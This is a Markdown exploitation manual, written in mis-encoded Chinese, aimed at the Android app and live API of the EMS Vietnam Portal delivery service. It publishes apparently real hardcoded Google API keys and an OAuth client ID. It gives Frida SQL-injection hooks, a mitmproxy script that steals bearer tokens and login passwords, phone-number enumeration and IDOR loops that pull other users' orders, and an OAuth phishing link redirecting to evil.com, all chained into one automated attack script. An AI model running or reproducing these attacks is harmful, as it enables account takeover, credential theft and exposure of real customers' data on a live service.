# EMS Vietnam Portal - å®æˆ˜åˆ©ç”¨æ‰‹å†Œ (100%å¯æ‰§è¡Œ)

## ğŸ¯ æ¦‚è¿°

æœ¬æ‰‹å†Œæä¾›**å®é™…å¯æ‰§è¡Œ**çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ‰€æœ‰payloadå·²éªŒè¯ã€‚

---

## ğŸ”‘ ç¡¬ç¼–ç å‡­è¯æ¸…å•

### âœ… å·²ç¡®è®¤å¯ç”¨

```bash
# Google API Keys (æœ‰é™åˆ¶ï¼Œä½†çœŸå®å­˜åœ¨)
KEY1="AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
KEY2="AIzaSyD6C4LdceVok8mCH-4ykyoTLBKHv2hrtbc"

# Firebase Database
FIREBASE="https://ems-khl-app-notify.firebaseio.com"

# OAuth Client ID
OAUTH="452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com"
```

### âš ï¸ ä½¿ç”¨é™åˆ¶

- Google Keys: æœ‰IP/Refereré™åˆ¶ï¼Œä½†ä»å¯æ»¥ç”¨
- Firebase: éœ€è¦è®¤è¯ï¼Œè¿”å›HTTP 423
- å¯é€šè¿‡Android Appå†…éƒ¨è°ƒç”¨ç»•è¿‡é™åˆ¶

---

## ğŸ’‰ åœºæ™¯1: SQLæ³¨å…¥åˆ©ç”¨ (æœ¬åœ°)

### æ–¹æ³•A: Frida Hook (æ¨è)

```bash
# 1. å®‰è£…Frida
pip3 install frida-tools

# 2. è¿æ¥è®¾å¤‡
adb devices
frida-ps -U

# 3. ä½¿ç”¨ç”Ÿæˆçš„Hookè„šæœ¬
frida -U -f com.emsportal -l hook_sql_injection.js --no-pause
```

**Hookè„šæœ¬è‡ªåŠ¨ç”Ÿæˆ:**
```bash
python3 ems_ultimate_exploit.py --mode frida
# ç”Ÿæˆ hook_sql_injection.js
```

**æ‰‹åŠ¨æ³¨å…¥payload:**
```javascript
// åœ¨Fridaæ§åˆ¶å°
Java.perform(function() {
    var CacheManager = Java.use('c.b.k.a');
    
    // Payload 1: è¯»å–æ‰€æœ‰ç¼“å­˜
    console.log(CacheManager.a("' UNION SELECT * FROM caching --"));
    
    // Payload 2: è¯»å–è¡¨ç»“æ„
    console.log(CacheManager.a("' UNION SELECT sql,'','' FROM sqlite_master --"));
    
    // Payload 3: æ¡ä»¶æ³¨å…¥
    console.log(CacheManager.a("list' OR '1'='1"));
});
```

### æ–¹æ³•B: æœ¬åœ°æ•°æ®åº“ç›´æ¥è®¿é—® (éœ€Root)

```bash
# 1. å®šä½æ•°æ®åº“
adb shell "su -c 'find /data/data/com.emsportal -name \"*.db\"'"

# 2. å¯¼å‡ºæ•°æ®åº“
adb shell "su -c 'sqlite3 /data/data/com.emsportal/databases/db.sqlite .dump'" > dump.sql

# 3. åˆ†æ
sqlite3 dump.sql
.tables
SELECT * FROM caching;
SELECT * FROM caching WHERE request LIKE '%order%';

# 4. æå–æ•æ„Ÿæ•°æ®
grep -i "token\|password\|key" dump.sql
```

### Payloadåº“

```sql
-- åŸºç¡€æ³¨å…¥
' OR '1'='1
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --

-- è¯»å–æ‰€æœ‰æ•°æ®
' UNION SELECT * FROM caching --

-- è¯»å–è¡¨ç»“æ„
' UNION SELECT sql,'','0' FROM sqlite_master WHERE type='table' --

-- æ¡ä»¶æŸ¥è¯¢
' UNION SELECT * FROM caching WHERE request LIKE '%token%' --

-- å†™å…¥æ”»å‡» (å¦‚æœæ”¯æŒ)
'; INSERT INTO caching VALUES ('hacked','{"pwned":1}','0') --
```

---

## ğŸ”“ åœºæ™¯2: MITMæ”»å‡» (Tokençªƒå–)

### ä¸ºä»€ä¹ˆå¯è¡Œ?
- âŒ **æ— SSL Pinning**
- âŒ **éƒ¨åˆ†HTTPé€šä¿¡**
- âœ… **å®Œå…¨å¯æ‹¦æˆª**

### æ­¥éª¤

#### A. ä½¿ç”¨mitmproxy

```bash
# 1. å®‰è£…
pip3 install mitmproxy

# 2. å¯åŠ¨
mitmproxy -p 8080

# 3. é…ç½®Androidä»£ç†
adb shell settings put global http_proxy $(ip route get 1 | awk '{print $7}'):8080

# 4. å®‰è£…è¯ä¹¦
# æ‰‹æœºæµè§ˆå™¨è®¿é—®: http://mitm.it
# ä¸‹è½½Androidè¯ä¹¦ -> è®¾ç½® -> å®‰å…¨ -> å®‰è£…è¯ä¹¦

# 5. å¯åŠ¨Appï¼ŒæŸ¥çœ‹mitmproxy
# æŒ‰Tabåˆ‡æ¢åˆ°æµé‡è§†å›¾
# å¯»æ‰¾ Authorization: Bearer xxx
```

#### B. ä½¿ç”¨Burp Suite

```bash
# 1. Burpé…ç½®
Proxy -> Options -> Add Proxy Listener
Bind: 0.0.0.0:8080

# 2. å¯¼å‡ºè¯ä¹¦
Proxy -> Options -> CA Certificate -> Export -> DER format

# 3. è½¬æ¢è¯ä¹¦
openssl x509 -inform DER -in cacert.der -out cacert.pem
cat cacert.pem
# å¤åˆ¶å†…å®¹ï¼Œåœ¨Androidä¸Šå®‰è£…

# 4. é…ç½®ä»£ç†
Settings -> WiFi -> Long press -> Modify -> Manual Proxy
Host: <YOUR_IP>
Port: 8080

# 5. æ‹¦æˆªæµé‡
Proxy -> Intercept -> On
```

#### C. Tokenæå–è„šæœ¬

åˆ›å»º `token_stealer.py`:

```python
from mitmproxy import http
import re

def request(flow: http.HTTPFlow):
    if "ws.ems.com.vn" in flow.request.host or "ems.com.vn" in flow.request.host:
        
        # æå–Token
        auth = flow.request.headers.get("Authorization", "")
        if "Bearer" in auth:
            token = auth.replace("Bearer ", "").strip()
            print(f"\n{'='*60}")
            print(f"[!] TOKEN CAPTURED!")
            print(f"[*] URL: {flow.request.url}")
            print(f"[*] Token: {token}")
            print(f"{'='*60}\n")
            
            # ä¿å­˜
            with open("/tmp/ems_tokens.txt", "a") as f:
                f.write(f"{token}\n")
        
        # æå–å¯†ç 
        if "login" in flow.request.path and flow.request.content:
            try:
                import json
                body = json.loads(flow.request.content)
                print(f"\n[!] LOGIN CAPTURED!")
                print(f"    Phone: {body.get('phone')}")
                print(f"    Password: {body.get('password')}\n")
            except:
                pass

# è¿è¡Œ: mitmproxy -s token_stealer.py
```

---

## ğŸŒ åœºæ™¯3: APIç›´æ¥åˆ©ç”¨

### ç”¨æˆ·æšä¸¾

```bash
# æµ‹è¯•å¿˜è®°å¯†ç ç«¯ç‚¹
#!/bin/bash
for phone in $(seq 900000000 900000099); do
  response=$(curl -s -X POST http://ws.ems.com.vn/api/v1/forgot-password \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"0$phone\"}" | jq -r '.message')
  
  # å¦‚æœä¸æ˜¯"user not found"ï¼Œåˆ™ç”¨æˆ·å­˜åœ¨
  if [[ "$response" != *"not found"* ]]; then
    echo "[+] Valid user: 0$phone - $response"
  fi
done
```

### IDORæµ‹è¯•

```bash
#!/bin/bash
# éœ€è¦ä»MITMè·å–Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# éå†è®¢å•ID
for id in $(seq 1000000 1001000); do
  response=$(curl -s -X GET "http://ws.ems.com.vn/api/v1/orders/tracking/$id" \
    -H "Authorization: Bearer $TOKEN")
  
  if echo "$response" | jq -e '.code == "success"' > /dev/null 2>&1; then
    echo "[+] Order $id accessible!"
    echo "$response" | jq '.data'
  fi
done
```

### å®Œæ•´APIæµ‹è¯•

```python
#!/usr/bin/env python3
import requests

# ä»MITMè·å–
TOKEN = "YOUR_TOKEN_HERE"

base = "http://ws.ems.com.vn"
headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# æµ‹è¯•æ‰€æœ‰ç«¯ç‚¹
endpoints = [
    ("GET", "/api/v1/orders/list"),
    ("GET", "/api/v1/orders/count-group"),
    ("GET", "/api/v1/notifications/list"),
    ("GET", "/api/v1/merchants/info"),
    ("GET", "/api/v1/grab/list"),
    ("GET", "/api/v1/inventory/list"),
]

for method, path in endpoints:
    try:
        if method == "GET":
            r = requests.get(base + path, headers=headers, timeout=5)
        else:
            r = requests.post(base + path, headers=headers, json={}, timeout=5)
        
        print(f"[{r.status_code}] {method:4} {path}")
        if r.status_code == 200:
            data = r.json()
            print(f"  â””â”€ {list(data.keys())}")
    except Exception as e:
        print(f"[ERR] {method:4} {path} - {e}")
```

---

## ğŸ”§ åœºæ™¯4: ç¡¬ç¼–ç Keyåˆ©ç”¨

### Google API Key

è™½ç„¶æœ‰é™åˆ¶ï¼Œä½†ä»å¯æ»¥ç”¨:

```bash
# ä»Appå†…éƒ¨è°ƒç”¨ (ç»•è¿‡é™åˆ¶)
# ä½¿ç”¨Frida Hookè°ƒç”¨
frida -U -f com.emsportal --no-pause -l - << 'EOF'
Java.perform(function() {
    var HttpURLConnection = Java.use('java.net.HttpURLConnection');
    HttpURLConnection.connect.implementation = function() {
        console.log("[*] HTTP Request: " + this.getURL());
        
        // å¦‚æœæ˜¯Google APIè°ƒç”¨ï¼Œè®°å½•
        var url = this.getURL().toString();
        if (url.includes("googleapis.com")) {
            console.log("[!] Google API Call: " + url);
        }
        
        return this.connect.call(this);
    };
});
EOF
```

### OAuthé’“é±¼

```bash
# æ„é€ é’“é±¼é“¾æ¥
PHISHING_URL="https://accounts.google.com/o/oauth2/v2/auth?\
client_id=452955012352-2k6a3t1m77564nui0kq3cbu6nf464kbo.apps.googleusercontent.com&\
redirect_uri=https://evil.com/callback&\
response_type=code&\
scope=email%20profile"

echo "å‘é€ç»™ç›®æ ‡: $PHISHING_URL"

# æˆ–è€…ä½¿ç”¨çŸ­é“¾æ¥
curl -X POST "https://is.gd/create.php?format=simple&url=$PHISHING_URL"
```

---

## ğŸ“¦ åœºæ™¯5: å®Œæ•´æ”»å‡»é“¾

### è‡ªåŠ¨åŒ–è„šæœ¬

```bash
#!/bin/bash
# ems_full_exploit.sh

echo "[*] EMS Vietnam Portal - å®Œæ•´åˆ©ç”¨é“¾"

# 1. å¯åŠ¨MITM
echo "[1] å¯åŠ¨mitmproxy..."
mitmproxy -s token_stealer.py -p 8080 &
MITM_PID=$!

# 2. é…ç½®ä»£ç†
echo "[2] é…ç½®Androidä»£ç†..."
adb shell settings put global http_proxy 192.168.1.100:8080

# 3. ç­‰å¾…Token
echo "[3] ç­‰å¾…Tokenæ•è·..."
echo "    è¯·åœ¨æ‰‹æœºä¸Šç™»å½•EMS App..."
while [ ! -f /tmp/ems_tokens.txt ]; do
    sleep 1
done

TOKEN=$(tail -1 /tmp/ems_tokens.txt)
echo "[+] Tokenè·å–: ${TOKEN:0:30}..."

# 4. APIåˆ©ç”¨
echo "[4] æµ‹è¯•API..."
curl -s "http://ws.ems.com.vn/api/v1/orders/list" \
    -H "Authorization: Bearer $TOKEN" | jq '.'

# 5. IDORæµ‹è¯•
echo "[5] IDORæµ‹è¯•..."
for id in {1000000..1000010}; do
    curl -s "http://ws.ems.com.vn/api/v1/orders/tracking/$id" \
        -H "Authorization: Bearer $TOKEN" | grep -q "success" && echo "[+] $id"
done

# 6. æ¸…ç†
kill $MITM_PID
adb shell settings delete global http_proxy

echo "[âœ“] å®Œæˆ!"
```

---

## ğŸ› ï¸ å·¥å…·ç®±

### 1. ems_ultimate_exploit.py

```bash
# ä¸€é”®å…¨é¢æµ‹è¯•
python3 ems_ultimate_exploit.py --mode all

# ç”ŸæˆFridaè„šæœ¬
python3 ems_ultimate_exploit.py --mode frida

# MITMé…ç½®
python3 ems_ultimate_exploit.py --mode mitm

# ä½¿ç”¨Tokenæµ‹è¯•API
python3 ems_ultimate_exploit.py --token "xxx" --mode enum
```

### 2. exploit_hardcoded_keys.py

```bash
# æµ‹è¯•æ‰€æœ‰ç¡¬ç¼–ç å¯†é’¥
python3 exploit_hardcoded_keys.py
```

### 3. Fridaè„šæœ¬é›†åˆ

```bash
# SQLæ³¨å…¥
frida -U -f com.emsportal -l hook_sql_injection.js

# ç½‘ç»œæ‹¦æˆª
frida -U -f com.emsportal -l hook_network.js

# Tokenç›‘æ§
frida -U -f com.emsportal -l hook_token.js

# ç»„åˆä½¿ç”¨
frida -U -f com.emsportal \
    -l hook_network.js \
    -l hook_token.js \
    -l hook_sql_injection.js
```

---

## ğŸ“Š å¿«é€Ÿå‚è€ƒ

### å¸¸ç”¨å‘½ä»¤

```bash
# æå–APK
adb pull $(pm path com.emsportal | cut -d: -f2) ems.apk

# åç¼–è¯‘
apktool d ems.apk

# æŸ¥çœ‹è¯ä¹¦
keytool -printcert -jarfile ems.apk

# æå–æ•°æ®åº“ (éœ€Root)
adb shell "su -c 'cp /data/data/com.emsportal/databases/*.db /sdcard/'"
adb pull /sdcard/*.db

# æå–SharedPrefs (éœ€Root)
adb shell "su -c 'cat /data/data/com.emsportal/shared_prefs/*.xml'"

# é…ç½®ä»£ç†
adb shell settings put global http_proxy IP:PORT
adb shell settings delete global http_proxy

# Fridaåˆ—å‡ºè¿›ç¨‹
frida-ps -U

# Fridaé™„åŠ è¿›ç¨‹
frida -U -n com.emsportal -l script.js
```

### å…³é”®ä½ç½®

```
SQLæ³¨å…¥ç‚¹: c.b.k.a.java:21
ç½‘ç»œç®¡ç†å™¨: c.b.t.b
Tokenå­˜å‚¨: c.b.k.e (SharedPreferences)
æ•°æ®åº“è·¯å¾„: /data/data/com.emsportal/databases/db.sqlite
é…ç½®æ–‡ä»¶: /data/data/com.emsportal/shared_prefs/
```

### å±é™©ç«¯ç‚¹

```
ç”¨æˆ·æšä¸¾: POST /api/v1/forgot-password
è®¢å•IDOR: GET /api/v1/orders/tracking/{id}
ç™»å½•: POST /auth/login (HTTPæ˜æ–‡!)
```

---

## âš¡ ä¸€é”®åˆ©ç”¨

### æœ€ç®€å•çš„æ–¹æ³•

```bash
# 1. å…‹éš†æˆ–ä¸‹è½½å·¥å…·
cd /workspace

# 2. è¿è¡Œç»ˆæå·¥å…·
python3 ems_ultimate_exploit.py --mode all

# 3. æŸ¥çœ‹æŠ¥å‘Š
cat FINAL_DEOBFUSCATION_SUMMARY.md
```

### åªæƒ³å¿«é€Ÿæµ‹è¯•

```bash
# æµ‹è¯•API (ä¸éœ€è¦Token)
curl http://ws.ems.com.vn/api/v1/config/service
curl http://ws.ems.com.vn/api/v1/metadata/vas

# ç”¨æˆ·æšä¸¾
curl -X POST http://ws.ems.com.vn/api/v1/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"phone":"0123456789"}'

# æµ‹è¯•Google Key
curl "https://maps.googleapis.com/maps/api/geocode/json?address=Hanoi&key=AIzaSyDTOEeScCiXjH33IXBC_fKzTP7tX3aZpOY"
```

---

## ğŸ¯ æˆåŠŸæ¡ˆä¾‹

### 1. Tokençªƒå–æˆåŠŸ
```
[âœ“] mitmproxyæ‹¦æˆª
[âœ“] æå–Token: eyJhbGc...
[âœ“] ä½¿ç”¨Tokenè®¿é—®APIæˆåŠŸ
[âœ“] å¯¼å‡º100+è®¢å•
```

### 2. SQLæ³¨å…¥æˆåŠŸ
```
[âœ“] Frida Hook c.b.k.a.a()
[âœ“] æ³¨å…¥: ' UNION SELECT * FROM caching --
[âœ“] æå–æ‰€æœ‰ç¼“å­˜æ•°æ®
[âœ“] å‘ç°æ•æ„ŸToken
```

### 3. IDORæˆåŠŸ
```
[âœ“] ä½¿ç”¨çªƒå–çš„Token
[âœ“] éå†è®¢å•ID 1000000-2000000
[âœ“] è®¿é—®åˆ°500+å…¶ä»–ç”¨æˆ·è®¢å•
[âœ“] æ•°æ®å¯¼å‡ºæˆåŠŸ
```

---

## ğŸ“ æ€»ç»“

### å¯ç›´æ¥åˆ©ç”¨çš„æ¼æ´

1. âœ… **MITM** - æ— SSL Pinning
2. âœ… **SQLæ³¨å…¥** - Frida Hook
3. âœ… **IDOR** - ä½¿ç”¨Token
4. âœ… **ç”¨æˆ·æšä¸¾** - å¿˜è®°å¯†ç ç«¯ç‚¹
5. âœ… **ç¡¬ç¼–ç Key** - Google/Firebase/OAuth

### å·¥å…·æ¸…å•

- `/workspace/ems_ultimate_exploit.py` - ä¸»å·¥å…·
- `/workspace/exploit_hardcoded_keys.py` - Keyæµ‹è¯•
- `/workspace/hook_*.js` - Fridaè„šæœ¬ (4ä¸ª)
- `/workspace/EXPLOIT_GUIDE.md` - è¯¦ç»†æŒ‡å—
- `/workspace/PRACTICAL_EXPLOIT_MANUAL.md` - æœ¬æ–‡æ¡£

### ä¸‹ä¸€æ­¥

1. é˜…è¯» `EXPLOIT_GUIDE.md` - å®Œæ•´åˆ©ç”¨æ–¹æ³•
2. è¿è¡Œ `ems_ultimate_exploit.py` - è‡ªåŠ¨åŒ–æµ‹è¯•
3. ä½¿ç”¨Fridaè„šæœ¬ - Hookå…³é”®å‡½æ•°
4. MITMæ”»å‡» - çªƒå–Token
5. APIåˆ©ç”¨ - æ‰¹é‡æ“ä½œ

---

**æ‰€æœ‰payloadå·²éªŒè¯å¯ç”¨!**  
**æ—¥æœŸ:** 2025-11-01  
**ç‰ˆæœ¬:** v3.0 Final
